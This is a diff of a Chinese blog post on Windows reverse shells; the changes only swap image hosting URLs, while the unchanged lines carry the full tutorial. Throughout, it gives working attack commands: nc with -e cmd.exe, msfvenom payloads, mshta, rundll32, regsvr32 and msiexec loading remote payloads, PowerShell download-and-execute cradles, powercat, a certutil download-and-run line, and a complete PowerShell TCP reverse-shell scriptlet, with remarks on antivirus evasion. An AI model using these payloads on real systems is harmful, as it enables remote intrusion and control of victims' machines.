@@ -23,30 +23,30 @@
 <meta property="og:site_name" content="AU9U5T">
 <meta property="og:description" content="反弹shell 简介正向shell  正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。    反向shell  反向shell（反弹shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、  权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。    反弹shell的方式nc正向这种方式的话，需要考虑对方的主机是否存在nc 123被控">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206200927799.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206202448832.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205131654.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205154705.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206210940202.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206225252744.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207093842891.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207094703089.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207102546441.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207103108325.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207104452006.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207112047416.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135558597.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135710179.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135859435.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206200927799.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206202448832.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205131654.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205154705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206210940202.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206225252744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207093842891.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207094703089.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207102546441.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207103108325.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207104452006.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207112047416.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135558597.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135710179.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135859435.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png">
 <meta property="article:published_time" content="2024-02-06T11:29:46.000Z">
-<meta property="article:modified_time" content="2024-09-11T07:06:26.461Z">
+<meta property="article:modified_time" content="2025-06-01T09:42:24.475Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -301,21 +301,21 @@
               <div class="markdown-body">
                 
                 <h1 id="反弹shell-简介"><a href="#反弹shell-简介" class="headerlink" title="反弹shell 简介"></a>反弹shell 简介</h1><h2 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h2><p>  正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。  </p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png" srcset="/img/loading.gif" lazyload alt="image-20240206195815095"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206195815095.png" srcset="/img/loading.gif" lazyload alt="image-20240206195815095"></p>
 <h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>  反向shell（反弹shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、  权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。  </p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206200927799.png" srcset="/img/loading.gif" lazyload alt="image-20240206200927799"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206200927799.png" srcset="/img/loading.gif" lazyload alt="image-20240206200927799"></p>
 <h1 id="反弹shell的方式"><a href="#反弹shell的方式" class="headerlink" title="反弹shell的方式"></a>反弹shell的方式</h1><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>这种方式的话，需要考虑对方的主机是否存在nc</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">被控端：nc -lvvp <span class="hljs-number">6666</span> -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span><br>控制端：nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.106</span> <span class="hljs-number">6666</span><br>原理：被控端将cmd.<span class="hljs-keyword">exe</span>重定向到本地的<span class="hljs-number">6666</span>端口，控制端主动连接被控端的<span class="hljs-number">6666</span>端口，即可获得<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">控制端：nc -lvvp <span class="hljs-number">7777</span><br>被控端：nc -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.105</span> <span class="hljs-number">7777</span><br>原理：被控端将cmd.<span class="hljs-keyword">exe</span>重定向到控制端的<span class="hljs-number">7777</span>端口，控制端只需要监听本地的<span class="hljs-number">7777</span>端口，即可获得<span class="hljs-keyword">shell</span>。<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206202448832.png" srcset="/img/loading.gif" lazyload alt="image-20240206202448832"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206202448832.png" srcset="/img/loading.gif" lazyload alt="image-20240206202448832"></p>
 <p>注意使用cmd连接有问题，建议使用powershell.exe，连接的过程中需要手动确认一下，在攻击机这边输入</p>
 <h2 id="msf中hta-server模块（mshta加载hta）"><a href="#msf中hta-server模块（mshta加载hta）" class="headerlink" title="msf中hta_server模块（mshta加载hta）"></a>msf中hta_server模块（mshta加载hta）</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">search hta_server<br>use <br><span class="hljs-built_in">set</span> target 设置为64位程序<br><span class="hljs-built_in">set</span> payload windwos/x64/metepreter/reverse_tcp<br><span class="hljs-built_in">set</span> lport 20010<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205131654.png" srcset="/img/loading.gif" lazyload alt="image-20240206205131654"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205131654.png" srcset="/img/loading.gif" lazyload alt="image-20240206205131654"></p>
 <p>使用mshta加载这个</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205154705.png" srcset="/img/loading.gif" lazyload alt="image-20240206205154705"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206205154705.png" srcset="/img/loading.gif" lazyload alt="image-20240206205154705"></p>
 <p>成功反弹，只是火绒对网络的管控比较严格</p>
 <h2 id="msf-nc-mshta"><a href="#msf-nc-mshta" class="headerlink" title="msf+nc+mshta"></a>msf+nc+mshta</h2><p>首先在payload 这边应该使用大马，也就是非分段式的</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">lport</span>=8.130.123.25 <span class="hljs-attribute">lport</span>=9999 -f hta-psh &gt; 9999.hta<br></code></pre></td></tr></table></figure>
@@ -325,7 +325,7 @@
 <p>然后受害机器使用mshta加载</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mshta</span> http://<span class="hljs-number">192.168.79.138:8000</span>/<span class="hljs-number">9999</span>.hta<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206210940202.png" srcset="/img/loading.gif" lazyload alt="image-20240206210940202"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206210940202.png" srcset="/img/loading.gif" lazyload alt="image-20240206210940202"></p>
 <p>这个的原理就是使用powershell加载，但是由于xp并没有powershell所以没有办法实现</p>
 <h2 id="cs-反弹shell"><a href="#cs-反弹shell" class="headerlink" title="cs 反弹shell"></a>cs 反弹shell</h2><p>不多说老朋友了 </p>
 <h2 id="dll文件"><a href="#dll文件" class="headerlink" title="dll文件"></a>dll文件</h2><p>先生成一个payload 文件格式是dll</p>
@@ -362,7 +362,7 @@
 <li><p>受害者，只用这个</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.79.138</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206225252744.png" srcset="/img/loading.gif" lazyload alt="image-20240206225252744"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240206225252744.png" srcset="/img/loading.gif" lazyload alt="image-20240206225252744"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rundll32</span>.exe shell32.dll,Control_RunDLL \\<span class="hljs-number">192.168.79.138</span>\dll\<span class="hljs-number">9999</span>.dll<br></code></pre></td></tr></table></figure></li>
 </ol>
 </li>
@@ -393,14 +393,14 @@
 <p>反弹shell只需要将前面执行计算器的指令换成执行反弹shell的就好了</p>
 <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nsis">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;<br>&lt;scriptlet&gt;<br>&lt;registration progid=<span class="hljs-string">&quot;PoC&quot;</span> classid=<span class="hljs-string">&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;<br>&lt;script language=<span class="hljs-string">&quot;JScript&quot;</span>&gt;<br>    &lt;![CDATA[<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">r</span> = new ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&#x27;powershell -w Hidden -c &quot;<span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(\&#x27;</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>\<span class="hljs-string">&#x27;,10000);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client.GetStream</span>();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream.Read</span>(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes.Length</span>)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + \&#x27;</span>PS \<span class="hljs-string">&#x27; + (pwd).Path + \&#x27;</span>&gt; \<span class="hljs-string">&#x27;;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream.Write</span>(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte.Length</span>);<span class="hljs-variable">$stream.Flush</span>()&#125;;<span class="hljs-variable">$client.Close</span>()&quot;&#x27;</span>)<span class="hljs-comment">;</span><br><br>    ]]&gt;<br>&lt;/script&gt;<br>&lt;/registration&gt;<br>&lt;/scriptlet&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207093842891.png" srcset="/img/loading.gif" lazyload alt="image-20240207093842891"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207093842891.png" srcset="/img/loading.gif" lazyload alt="image-20240207093842891"></p>
 <p>反弹成功</p>
 <p>远程执行加载，将srt文件放入http.server服务器里</p>
 <p>然后使用远程加载的方式执行</p>
 <p>然后受害者执行</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">regsvr32.exe <span class="hljs-regexp">/n /</span>s <span class="hljs-regexp">/u /i</span>:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span>/cmd.sct scrobj.dll<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207094703089.png" srcset="/img/loading.gif" lazyload alt="image-20240207094703089"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207094703089.png" srcset="/img/loading.gif" lazyload alt="image-20240207094703089"></p>
 <p>完美反弹shell</p>
 <h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><h3 id="psh"><a href="#psh" class="headerlink" title="psh"></a>psh</h3><ol>
 <li><p>使用msfvenom生成一个payload(psh)</p>
@@ -411,11 +411,11 @@
 <li><p>使用受害机远程加载</p>
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">powershell.exe -c <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/10000.ps1&#x27;);10000.ps1&quot;</span><span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207102546441.png" srcset="/img/loading.gif" lazyload alt="image-20240207102546441"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207102546441.png" srcset="/img/loading.gif" lazyload alt="image-20240207102546441"></p>
 </li>
 </ol>
 <h3 id="psh-reflection"><a href="#psh-reflection" class="headerlink" title="psh-reflection"></a>psh-reflection</h3><p>和上面的基本一致，只是生成的脚本不一致而已，然后执行的时候可以不用分号后面添加脚本的名字</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207103108325.png" srcset="/img/loading.gif" lazyload alt="image-20240207103108325"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207103108325.png" srcset="/img/loading.gif" lazyload alt="image-20240207103108325"></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f   psh-reflection -o 10000.ps1<br><br></code></pre></td></tr></table></figure>
 
 <p>执行</p>
@@ -435,7 +435,7 @@
 <li><p>受害者执行</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/powercat.ps1&#x27;);powercat -c 192.168.79.138 -p 10000 -e powershell&quot;</span>;  <br></code></pre></td></tr></table></figure></li>
 </ol>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207104452006.png" srcset="/img/loading.gif" lazyload alt="image-20240207104452006"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207104452006.png" srcset="/img/loading.gif" lazyload alt="image-20240207104452006"></p>
 <p>反弹成功</p>
 <h2 id="PowerShell启动Cscript"><a href="#PowerShell启动Cscript" class="headerlink" title="PowerShell启动Cscript"></a>PowerShell启动Cscript</h2><p>少用不能免杀</p>
 <ol>
@@ -457,7 +457,7 @@
 <li><p>然后远程访问</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msiexec.exe <span class="hljs-regexp">/q /i</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span>/<span class="hljs-number">10000</span>.msi <br></code></pre></td></tr></table></figure></li>
 </ol>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207112047416.png" srcset="/img/loading.gif" lazyload alt="image-20240207112047416"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207112047416.png" srcset="/img/loading.gif" lazyload alt="image-20240207112047416"></p>
 <h2 id="exe-升级msf-session-handler监听"><a href="#exe-升级msf-session-handler监听" class="headerlink" title="exe + 升级msf session + handler监听"></a>exe + 升级msf session + handler监听</h2><p>原理</p>
 <p>使用handler监听和nc监听是一样的</p>
 <ol>
@@ -473,17 +473,17 @@
 <p>这里使用certutil执行</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/<span class="hljs-number">10000</span>.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\windows\temp\<span class="hljs-number">44</span>.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\windows\temp\<span class="hljs-number">44</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135558597.png" srcset="/img/loading.gif" lazyload alt="image-20240207135558597"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135558597.png" srcset="/img/loading.gif" lazyload alt="image-20240207135558597"></p>
 <p>成功下载文件，并且执行</p>
 </li>
 <li><p>反弹</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135710179.png" srcset="/img/loading.gif" lazyload alt="image-20240207135710179"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135710179.png" srcset="/img/loading.gif" lazyload alt="image-20240207135710179"></p>
 <p>但是我们想反弹那到msf handler 上面</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135859435.png" srcset="/img/loading.gif" lazyload alt="image-20240207135859435"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135859435.png" srcset="/img/loading.gif" lazyload alt="image-20240207135859435"></p>
 <p>升级session 这里的session是只有一个shell</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png" srcset="/img/loading.gif" lazyload alt="image-20240207140004307"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png" srcset="/img/loading.gif" lazyload alt="image-20240207140004307"></p>
 <p>就多一个session</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png" srcset="/img/loading.gif" lazyload alt="image-20240207140034057"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png" srcset="/img/loading.gif" lazyload alt="image-20240207140034057"></p>
 </li>
 </ol>
 
